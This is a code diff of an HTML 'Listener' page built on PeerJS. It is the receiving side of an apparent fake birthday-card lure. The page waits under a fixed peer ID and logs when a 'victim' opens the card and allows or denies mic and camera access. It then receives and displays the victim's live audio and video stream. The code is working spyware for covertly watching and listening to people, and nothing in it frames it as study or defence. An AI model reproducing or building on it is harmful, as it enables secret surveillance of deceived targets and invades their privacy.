@@ -1,22 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <title>🎧 Listener</title>
   <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 1rem; }
+    #logs { text-align: left; max-width: 400px; margin: auto; }
+    #remoteCam { width: 300px; margin-top: 1rem; border-radius: 10px; }
+  </style>
 </head>
 <body>
-  <h2>👂 Listening...</h2>
-  <video id="remoteCam" autoplay playsinline style="width: 300px;"></video>
+  <h2>👂 Listening for Card Events</h2>
+  <div id="logs"><strong>Events:</strong><ul id="events"></ul></div>
+  <video id="remoteCam" autoplay playsinline></video>
 
   <script>
-    const peer = new Peer("birthday-listener", { debug: 2 });
-    peer.on('call', call => {
-      call.answer();
-      call.on('stream', remoteStream => {
-        document.getElementById("remoteCam").srcObject = remoteStream;
+    const LISTENER_ID = 'birthday-listener';
+    const peer = new Peer(LISTENER_ID, { debug: 2 });
+    const eventsUl = document.getElementById('events');
+
+    function log(msg) {
+      const li = document.createElement('li');
+      li.textContent = msg;
+      eventsUl.appendChild(li);
+    }
+
+    peer.on('open', () => {
+      log(`🔌 Listener ready as "${LISTENER_ID}"`);
+    });
+
+    // استقبال DataChannel للأحداث
+    peer.on('connection', conn => {
+      conn.on('data', data => {
+        if (data.event === 'page-open')    log('📥 Victim opened the card');
+        if (data.event === 'mic-allowed')  log('🔊 Victim allowed mic & camera');
+        if (data.event === 'mic-denied')   log('🚫 Victim denied mic/camera');
       });
+    });
+
+    // استقبال بث الصوت والفيديو
+    peer.on('call', call => {
+      log('📞 Incoming media call');
+      call.answer(); // نستقبل فقط
+      call.on('stream', remoteStream => {
+        document.getElementById('remoteCam').srcObject = remoteStream;
+        log('🎥 Audio/Video stream started');
+      });
+    });
+
+    peer.on('error', err => {
+      console.error(err);
+      log('❗ Error: ' + err);
     });
   </script>
 </body>
 </html>
+
